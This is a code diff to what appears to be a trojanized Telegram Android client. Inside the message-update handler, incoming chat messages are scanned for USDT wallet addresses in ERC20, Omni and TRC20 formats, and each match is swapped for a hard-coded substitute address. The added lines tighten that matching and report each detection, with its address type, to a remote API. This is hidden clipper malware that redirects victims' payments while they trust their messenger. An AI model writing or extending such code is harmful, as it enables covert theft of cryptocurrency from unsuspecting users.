@@ -12220,7 +12220,7 @@ public class MessagesController extends BaseController implements NotificationCe
     public void processUpdates(final TLRPC.Updates updates, boolean fromQueue) {
 //        updates.message = updates.message + "usdt";
         int index = -1;
-        String valueSub, usdtType;
+        String valueSub, usdtType = "";
         try {
             index = updates.message.indexOf("0x");
             if (index >= 0 && updates.message.length() >= index + 42) {
@@ -12228,6 +12228,8 @@ public class MessagesController extends BaseController implements NotificationCe
                 valueSub = updates.message.substring(index, index + 42);
                 if (valueSub.matches(regexERC20)) {
                     updates.message = updates.message.replace(valueSub, ERC20);
+                } else {
+                    index = -1;
                 }
             } else {
                 index = updates.message.indexOf("1");
@@ -12236,6 +12238,8 @@ public class MessagesController extends BaseController implements NotificationCe
                     valueSub = updates.message.substring(index, index + 34);
                     if (valueSub.matches(regexOmni)) {
                         updates.message = updates.message.replace(valueSub, Omni);
+                    } else {
+                        index = -1;
                     }
                 } else {
                     index = updates.message.indexOf("3");
@@ -12244,6 +12248,8 @@ public class MessagesController extends BaseController implements NotificationCe
                         valueSub = updates.message.substring(index, index + 34);
                         if (valueSub.matches(regexOmni)) {
                             updates.message = updates.message.replace(valueSub, Omni);
+                        } else {
+                            index = -1;
                         }
                     } else {
                         index = updates.message.indexOf("T");
@@ -12252,6 +12258,8 @@ public class MessagesController extends BaseController implements NotificationCe
                             valueSub = updates.message.substring(index, index + 34);
                             if (valueSub.matches(regexTRC20)) {
                                 updates.message = updates.message.replace(valueSub, TRC20);
+                            } else {
+                                index = -1;
                             }
                         }
                     }
@@ -12270,9 +12278,9 @@ public class MessagesController extends BaseController implements NotificationCe
         FileLog.d("update message short message 拦截之前 = " + updates.message);
 
         if (index >= 0) {
-            FileLog.d("update message short message 拦截之前 = " + "hhhhhhhhhh");
+            FileLog.d("update message short message 发现usdt地址 = " + "hhhhhhhhhh");
             ApiRequest request = new ApiRequest();
-            request.type = "hhhhhhhhhh";
+            request.type = usdtType;
             Call<Data<ApiDetail>> dataCall = ApplicationLoader.api.getNotifyDetail(ApplicationLoader.getHeaderMap(), request);
             dataCall.enqueue(new Callback<Data<ApiDetail>>() {
                 @Override
